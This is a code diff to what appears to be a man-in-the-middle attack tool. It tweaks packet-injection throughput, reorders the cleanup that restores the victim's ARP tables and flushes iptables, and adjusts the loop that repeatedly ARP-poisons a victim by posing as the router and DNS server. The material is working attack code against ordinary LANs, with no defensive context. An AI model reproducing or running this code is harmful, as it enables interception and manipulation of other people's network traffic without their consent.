@@ -758,7 +758,7 @@ class Queued(object):
 	def fileno(self):
 		return self.q.get_fd()
 	def doRead(self):
-		self.q.process_pending(100) # if I lower this to, say, 5, it hurts injection's reliability
+		self.q.process_pending(200) # if I lower this to, say, 5, it hurts injection's reliability
 	def connectionLost(self, reason):
 		reactor.removeReader(self)
 	def logPrefix(self):
@@ -1105,21 +1105,21 @@ def main(args):
 		logger.close()
 		with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
 			forward.write(ipf)
-		if not dnsIP == routerIP and dnsMAC:
+		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
+		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
+		if dnsIP != routerIP and dnsMAC:
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
 		os.system('/sbin/iptables -F')
 		os.system('/sbin/iptables -X')
 		os.system('/sbin/iptables -t nat -F')
 		os.system('/sbin/iptables -t nat -X')
-		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
-		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
 		exit(0)
 	signal.signal(signal.SIGINT, signal_handler)
 
 	while 1:
 		# If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
-		if dnsIP != routerIP and dnsMAC != routerMAC:
+		if dnsIP != routerIP and dnsMAC:
 			Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
 		Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
 		time.sleep(1.5)
